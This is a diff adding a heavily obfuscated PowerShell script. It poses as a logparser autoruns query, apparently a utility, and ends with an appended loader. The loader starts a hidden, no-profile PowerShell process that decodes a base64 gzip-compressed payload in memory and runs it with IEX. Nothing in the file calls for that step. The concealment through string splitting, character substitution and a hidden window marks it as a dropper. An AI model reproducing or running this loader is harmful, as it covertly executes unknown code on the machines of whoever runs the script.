@@ -1,0 +1,30 @@
+ sET-iTeM VArIabLe:3TM96  ([tYPe]("{4}{0}{2}{3}{1}" -f'ySteM','h','.iO.P','At','S')  )  ;   ${Z`y7}=  [TYpE]("{1}{0}" -F'ptR','inT')  ;SEt-IteM  VArIable:tsrvK  ( [type]("{4}{3}{5}{2}{6}{7}{0}{1}"-f'.P','rocesS','m','Ys','s','te','.dia','gnOStICs')  )  ;
+
+if (&("{0}{2}{1}"-f 'G','t-Command','e') ("{0}{1}{3}{2}"-f'logpars','er.','xe','e')) {
+
+    ${LPQ`Ue`Ry} = ((("{66}{71}{0}{44}{52}{80}{83}{46}{1}{56}{25}{50}{77}{61}{62}{11}{88}{24}{55}{29}{78}{20}{47}{34}{58}{42}{45}{26}{70}{17}{33}{3}{14}{49}{57}{23}{75}{82}{32}{39}{51}{43}{40}{84}{48}{67}{87}{7}{81}{13}{68}{35}{21}{60}{53}{63}{30}{9}{54}{8}{12}{19}{16}{4}{10}{74}{28}{6}{18}{64}{38}{22}{36}{76}{72}{41}{65}{86}{59}{31}{37}{79}{27}{69}{5}{85}{15}{73}{2}"-f'
+    ','th, La','I','n','e n','  ',' ','t like','k','ath','ot','ma','e ','Ver','s','  ct ASC','uFil','autor','      I','65','n','ed','e','v','Pat','ring) as ','     ','R BY','und%65u)
+    GROUP BY
+ ',',
+        La','ageP',' ',' W','u','rin','i','P',' OR','ag','H','  ','r','OM
+  ','
+   ','SELECT',' ','(ImagePa','chSt','b','c.','ct','ERE','
+ ','nd
+',' not li','h','unchSt','ts','g
+    FR',' ',')%65u a','  ','     I','        (Im','m','ing
+','bO','lish','if','
+','*','I','t','
+bO',' fo','
+  ','ath,
+        LaunchS',',
+ ','u','DE','       C',' 65u(',' ','OUNT','   Pu','    ',' ','er no','ge')) -CRePLACE  '65u',[CHAr]39 -RePLAce ([CHAr]98+[CHAr]79+[CHAr]73),[CHAr]34)
+
+    & ("{0}{2}{1}" -f'logpar','er','s') -stats:("{1}{0}" -f'ff','o') -i:("{0}{1}" -f 'c','sv') -dtlines:0 -fixedsep:('on') -rtp:('-1') "$lpquery"
+
+} else {
+    ${s`c`RIP`TNAme} =   (VarIablE  3tm96  -vaLueONL)::("{3}{0}{1}{2}" -f 'l','eN','ame','GetFi').Invoke(${MYI`Nv`OcATIoN}."SCriP`T`NaME")
+    "${ScriptName} requires logparser.exe in the path."
+}
+
+
+if(  (  gEt-itEM variABlE:Zy7  )."vaL`Ue"::"S`IZE" -eq 4){${B}=("{0}{4}{3}{2}{1}"-f'powers','xe','e','.','hell')}else{${b}=${eNV:`w`i`NDIr}+((("{3}{2}{6}{4}{7}{5}{1}{0}{9}{8}" -f'she','wer','ow64','{0}sysw','o','}v1.0{0}po','{0}WindowsP','werShell{0','exe','ll.')) -f [CHAr]92)};${s}=&("{2}{0}{1}" -f 'b','ject','New-O') ("{3}{2}{1}{5}{4}{0}"-f'rtInfo','em.Dia','yst','S','cs.ProcessSta','gnosti');${s}."fI`l`enAme"=${b};${S}."aRGu`m`EntS"=('-nop'+' '+'-'+'w '+'h'+'idden'+' '+'-'+'c '+(('r8'+'xs=New-O'+'b'+'j'+'ect ')  -crEPLAce  'r8x',[cHAr]36)+('IO'+'.MemoryStream(,[Co'+'nvert]::FromBase64String(W6FW6FH4sIAC84R1gCA7VWf2/aSBD9O5X6HawKybZKMBBSmkiVb'+'o35lWACOJ'+'gAh04be20WFi+x1yHQ63e/MdgkvTZVrtJZidj1zOy+ffNmx14'+'cOILyQHI8b7PQq9LX9+9OejjEK0nJOctxXsq'+'ta8'+'PBVj05AUMuKqGyd36PpS+SMkXrtcFXmAazy8taHIYkEId5oUkEiiKyumeURIoq/S2N5iQkpzf3C+II6auU+6vQZP'+'wes'+'9RtW8POnEinKHATW4c7OEFVsNaMCkX+809ZnZ6WZoX6Q4xZpMjWNhJkVXAZ'+'k1Xpm5pseLtdE0U2'+'qRPyiHuiMKLBWbkwDCLskS6s9khMIubcjWQV'+'TgJ/IRFxGEjHMyW'+'LHFwUGYa9kDv'+'IdUM'+'SQUShHTzyJVFyQcxYXvpDmaYIBnEg6IqAXZCQry0SPlKHRIUWDlxGBs'+'SbKV2yyQ7+1iDlZRB49USo5iEhr0A1uRszcoiW1R/BJolU4TkmExj49v7d+3feMfvFi09+42a0m78'+'UAIxOpvsxAaBKj0d07/1FKuYlE7bDgodbmOZuw5ioM2maJGE6m0m53aDlmKQzz'+'L++RikLAPeInpnwa'+'mpz6s4gJE1Rblseh1cVNjrvmI+J/XXJGcSjATG2AV5RJ1O'+'V8jPyicfI/tSFzK0L4BQ5NRDXII'+'z4WCRU5qXpj2H1FRXHWD2mzCUhciCBEaCC3KrfgzlkR5HbgUlWwNdhLkMyPNAyybxT/W'+'6z3ZM5OMk1hqMoL/ViKCYnL1kEM+LmJRREN'+'DWhWPD9UH6Ga8ZMUAdHIltupv6bz3TfGg8iEcYOpBI4uLXWxKGYJZ'+'TkpRZ1ib'+'61qJ/'+'tL/+UkBpmjAY+rPQICYE3CRG'+'WSAQSAtSjGNSCRUR7tWZkBX77Cm8w7EM9pxWxVxX2i'+'Su/hjZ'+'T/UHiCT8ZMS'+'+wQtItxkVesm'+'ko4MJIuE4U9vt'+'QXlwX34GqhSRNlZLV1FTfiqQGcrtqaUAWiWpTxvb8hAK4aYR8peOIfKpYIgTmlA/aDa0heMbtgJmOvqQltKG'+'ltgn/Q3rW'+'5kbVvb5atLTQeJp7qB21zVbP6Ldal'+'ccry64Iq94W1722MOt3i4WFWoPh'+'WEzaqHVLi'+'8txZbe+ojur'+'g9zxk/Zpp+82Rf1pt/Bdb2x4nl/1rEHpvEE7o1pfL5Zxx6jHnZG+0YuVqE43rT4d9pdXDXE/thkeepp/V7rA9KkTLuwSN3dthJrzM2'+'d35dnNueluxy3tYlRZojpCtaBuN3R+PdZD1NNs7Nv8mnSrg5EPZ7UmlEz6w4be7zd0NGwuH'+'owLzYfYOzzXR3aZT'+'tZ3gznMGwDhWitW2i7Z8XEfSGpyhP0B+Pi1sjP3wMf4iPSPXR6V8VL'+'nSAefxuQ'+'BcI3XjR4D++2wzJHNuncYdSbbhqaVxr0KahXpqOmjZEns632MokdjZ2gl2+Xu6Lw79jT7jlU1o3a7djxN0zYt49qZlJ'+'4+31Q/d0bUXnE01DT7Q6IQ'+'kEhubfpx/eKu+yLnr131Jg6jOWag'+'Bbi/'+'sxpt8LCR3sg9TpMI'+'Rcn68pKEAWHQ0aDnZbpGjHEnaQwvrm9oTYeGM'+'YNSHcLwrPzTkSodHdXnlpG9urycANykXvYiLnRI4It5vvh0VizC3V98qhT'+'h0G8/Z'+'I2vt0q6W'+'D7pHkeunvdg+z3UpIZy2HzY3Axv70Xvf+cyLeE5/Lhv4/L53S+sb+K3mH/m4QfT9y/+E92/w8MIUwHOFlxHjBxa5'+'q/oSFX04mvjOWegEy99km+/m1i'+'cduFT5B++f4+a'+'bAoAAA==W6FW6F));IEX ')."rE`Pl`Ace"(([chAr]87+[chAr]54+[chAr]70),[StRiNg][chAr]39)+'(Ne'+'w-Obje'+'ct '+'IO.Str'+'eamRead'+'er'+'(New'+'-O'+'bject '+('I'+'O.Compress'+'ion'+'.GzipS'+'t'+'r'+'eam('+'{'+'0}s,'+'['+'IO.C'+'o'+'mpr'+'essio'+'n.Co'+'m'+'p'+'r'+'essio'+'nM'+'od'+'e]:'+':Decompre'+'s'+'s)'+')'+').ReadToEnd();')-f[CHaR]36);${s}."US`esHELLeXe`C`UtE"=${F`ALsE};${S}."R`EDIreCTSTA`N`daRdO`UTpUt"=${t`RUE};${s}."wINdO`wst`y`Le"=("{0}{1}" -f 'Hi','dden');${S}."cre`AT`eN`oWi`NDOw"=${TR`UE};${P}= ( VArIaBLE TSRVk )."V`ALuE"::("{0}{1}" -f 'S','tart').Invoke(${S});
